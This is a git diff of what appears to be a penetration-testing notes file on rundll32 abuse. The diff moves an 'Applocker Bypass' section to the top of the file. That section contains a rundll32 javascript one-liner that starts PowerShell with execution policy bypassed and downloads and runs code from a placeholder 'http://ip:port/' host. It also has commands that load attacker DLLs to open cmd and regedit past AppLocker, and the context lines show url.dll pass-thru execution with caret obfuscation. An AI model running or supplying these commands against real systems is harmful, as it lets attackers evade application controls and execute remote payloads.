@@ -1,3 +1,37 @@
+# Applocker Bypass
+https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
+
+The following command needs to be executed from the command prompt. If the command prompt is locked then the method that is described below can be used to unlock the cmd.
+```
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
+```
+
+The utility rundll32 can then load and execute the payload that is inside the pentestlab.dll.
+```
+rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll
+```
+## Open Command Prompt
+Since the rundll32 is a trusted Microsoft utility it can be used to load the cmd.dll into a process, execute the code on the DLL and therefore bypass the AppLocker rule and open the command prompt. The following two commands can be executed from the Windows Run:
+```
+rundll32 C:\cmd.dll,EntryPoint
+```
+OR
+```
+rundll32 shell32.dll,Control_RunDLL C:\cmd.dll
+```
+## Open Registry Editor
+
+
+The following commands can load and run the regedit.dll via rundll32 and therefore bypass the AppLocker rule.
+```
+rundll32 C:\regedit.dll,EntryPoint
+```
+OR
+```
+rundll32 shell32.dll,Control_RunDLL C:\regedit.dll
+```
+
+
 # PASS-THRU COMMAND EXECUTION WITH ‘TelnetProtocolHandler’
 https://twitter.com/nas_bench/status/1432781693279248390
 
@@ -34,7 +68,6 @@ rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e
 rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
 ```
 
-
 DLL Exports:
 1. TelnetProtocolHandler	
 2. TelnetProtocolHandlerA	
@@ -53,43 +86,6 @@ DLL Exports:
 15. MIMEAssociationDialogA
 16. InetIsOffline	
 17. MailToProtocolHandler
-
-
-
-
-# Applocker Bypass
-https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
-
-The following command needs to be executed from the command prompt. If the command prompt is locked then the method that is described below can be used to unlock the cmd.
-```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
-```
-
-The utility rundll32 can then load and execute the payload that is inside the pentestlab.dll.
-```
-rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll
-```
-## Open Command Prompt
-Since the rundll32 is a trusted Microsoft utility it can be used to load the cmd.dll into a process, execute the code on the DLL and therefore bypass the AppLocker rule and open the command prompt. The following two commands can be executed from the Windows Run:
-```
-rundll32 C:\cmd.dll,EntryPoint
-```
-OR
-```
-rundll32 shell32.dll,Control_RunDLL C:\cmd.dll
-```
-## Open Registry Editor
-
-
-The following commands can load and run the regedit.dll via rundll32 and therefore bypass the AppLocker rule.
-```
-rundll32 C:\regedit.dll,EntryPoint
-```
-OR
-```
-rundll32 shell32.dll,Control_RunDLL C:\regedit.dll
-```
-
 
 
 
